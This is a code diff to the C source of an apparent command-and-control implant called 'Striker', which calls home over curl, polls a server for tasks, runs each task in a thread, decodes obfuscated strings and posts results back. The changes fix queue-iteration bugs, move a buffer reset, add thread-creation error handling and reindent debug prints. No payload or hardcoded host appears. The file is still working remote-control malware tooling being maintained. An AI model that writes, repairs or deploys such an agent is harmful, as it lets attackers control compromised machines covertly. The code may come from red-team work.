@@ -48,7 +48,7 @@ CURL *init_curl(const char *path, buffer *buff){
   CURL *curl = curl_easy_init();
   if (!curl){
     #ifdef STRIKER_DEBUG
-      fprintf(stderr, "[-]Error initializing curl!\n");
+    fprintf(stderr, "[-]Error initializing curl!\n");
     #endif
     exit(EXIT_FAILURE);
   }
@@ -389,7 +389,7 @@ void *task_executor(void *ptr){
   session *striker = tskw->striker;
   task *tsk = tskw->tsk;
   #ifdef STRIKER_DEBUG
-    printf("[*] Executing task: %s\n", tsk->uid);
+  printf("[*] Executing task: %s\n", tsk->uid);
   #endif
   cJSON *data = tsk->data;
   buffer *result_buff = create_buffer(0);
@@ -488,7 +488,7 @@ void *task_executor(void *ptr){
     for (int i = 0; i < 2; i++)
       obfs_decode(strs[i]);
     #ifdef STRIKER_DEBUG
-      printf("[+] Task completed: %s\n", tsk->uid);
+    printf("[+] Task completed: %s\n", tsk->uid);
     #endif
     if (!tsk->completed){    
       char *res = buffer_to_string(result_buff);
@@ -547,7 +547,7 @@ void start_session(){
     curl_easy_cleanup(curl);
     if (res != CURLE_OK){
       #ifdef STRIKER_DEBUG
-        fprintf(stderr, "[-] Error calling home: %s\n", curl_easy_strerror(res));
+      fprintf(stderr, "[-] Error calling home: %s\n", curl_easy_strerror(res));
       #endif
       sleep(striker->delay);
       continue;
@@ -560,8 +560,8 @@ void start_session(){
   cJSON *config = cJSON_Parse(config_str);
   if (!config){
     #ifdef STRIKER_DEBUG
-      const char *error = cJSON_GetErrorPtr();
-      fprintf(stderr, "[-] Error parsing config: %s\n", error);
+    const char *error = cJSON_GetErrorPtr();
+    fprintf(stderr, "[-] Error parsing config: %s\n", error);
     #endif
     goto end;
   }
@@ -572,7 +572,7 @@ void start_session(){
   }
   strncpy(striker->uid, tmp, AGENT_UID_SIZE - 1);
   #ifdef STRIKER_DEBUG
-    printf("[*] Agent config: %s\n", config_str);
+  printf("[*] Agent config: %s\n", config_str);
   #endif
   cJSON_Delete(config);
   free(config_str);
@@ -583,7 +583,6 @@ void start_session(){
   queue *completed_tasks = queue_init(MAX_TASKS_QUEUE);
   while (!striker->abort){
     queue_seek(completed_tasks, 0);
-    resize_buffer(body, 0);
     unsigned long next_cb_time = (unsigned long)time(NULL) + striker->delay;
     while ((unsigned long)time(NULL) < next_cb_time){
       sleep(1); // We don't want to wait for the whole callback delay before sending task results. A 1 sec sleep also allow us to bundle results for mutliple tasks that finish quickly.
@@ -594,14 +593,15 @@ void start_session(){
         if (tsk->completed){
           queue_put(completed_tasks, tsk);
           queue_remove(tasks_queue, i);
+          queue_seek(tasks_queue, tasks_queue->pos - 1);
           i--;
         }
       }
-      // Build result and send results.
+      // Build and send results.
       queue_seek(completed_tasks, 0);
       if (completed_tasks->count > 0){
         #ifdef STRIKER_DEBUG
-          printf("[+] Sending results for %ld tasks\n", completed_tasks->count);
+        printf("[+] Sending results for %ld tasks\n", completed_tasks->count);
         #endif
         cJSON *results = cJSON_CreateArray();
         while (!queue_exhausted(completed_tasks)){
@@ -618,7 +618,7 @@ void start_session(){
           curl_easy_cleanup(curl);
           if (res != CURLE_OK){
             #ifdef STRIKER_DEBUG
-              fprintf(stderr, "[-] Error calling home: %s\n", curl_easy_strerror(res));
+            fprintf(stderr, "[-] Error calling home: %s\n", curl_easy_strerror(res));
             #endif
             sleep(striker->delay);
             continue;
@@ -630,6 +630,7 @@ void start_session(){
           task *tsk = queue_get(completed_tasks);
           cJSON_DetachItemFromArray(results, completed_tasks->pos - 1); // To avoid double free when later calling the cJSON_Delete() with the `results` JSON after calling free_task()
           queue_remove(completed_tasks, completed_tasks->pos - 1);
+          queue_seek(completed_tasks, completed_tasks->pos - 1);
           free_task(tsk);
         }
         cJSON_Delete(results);
@@ -637,13 +638,14 @@ void start_session(){
       }
     }
     // Fetch new tasks tasks.
+    resize_buffer(body, 0);
     curl = init_curl(tasksURL, body);
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, get_headers);
     res = curl_easy_perform(curl);
     curl_easy_cleanup(curl);
     if (res != CURLE_OK){
       #ifdef STRIKER_DEBUG
-        fprintf(stderr, "[-] Error calling home: %s\n", curl_easy_strerror(res));
+      fprintf(stderr, "[-] Error fetching tasks: %s\n", curl_easy_strerror(res));
       #endif
       continue;
     }
@@ -661,7 +663,14 @@ void start_session(){
       tskw->striker = striker;
       tskw->tsk = tsk;
       pthread_t t;
-      pthread_create(&t, NULL, task_executor, (void *)tskw);
+      if (pthread_create(&t, NULL, task_executor, (void *)tskw)){
+        #ifdef STRIKER_DEBUG
+        fprintf(stderr, "[-] Error starting thread for task: %s\n", tsk->uid);
+        #endif
+        queue_remove(tasks_queue, tasks_queue->count - 1);
+        free_task(tsk);
+        free(tskw);
+      }
       i--;
       tasksLen--;
     }
